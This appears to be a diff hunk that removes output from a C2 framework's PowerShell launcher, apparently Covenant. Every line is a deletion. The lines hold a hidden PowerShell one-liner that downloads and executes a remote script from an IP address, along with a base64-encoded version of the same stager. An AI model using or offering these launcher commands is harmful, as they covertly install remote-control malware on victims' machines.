@@ -1,7 +1,0 @@
-[*] PowerShellLauncher hosted at: http://129.21.228.140/home/administrator/covdeploy/fun.ps1
-[+] Launcher (Command):        powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://129.21.228.140/home/administrator/covdeploy/fun.ps1')"
-[+] Launcher (EncodedCommand): powershell -Sta -Nop -Window Hidden -EncodedCommand 
-aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAG
-wAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADkALgAyADEALgAyADIAOAAuADEANAAwAC8AaABvA
-G0AZQAvAGEAZABtAGkAbgBpAHMAdAByA
-GEAdABvAHIALwBjAG8AdgBkAGUAcABsAG8AeQAvAGYAdQBuAC4AcABzADEAJwApAA==
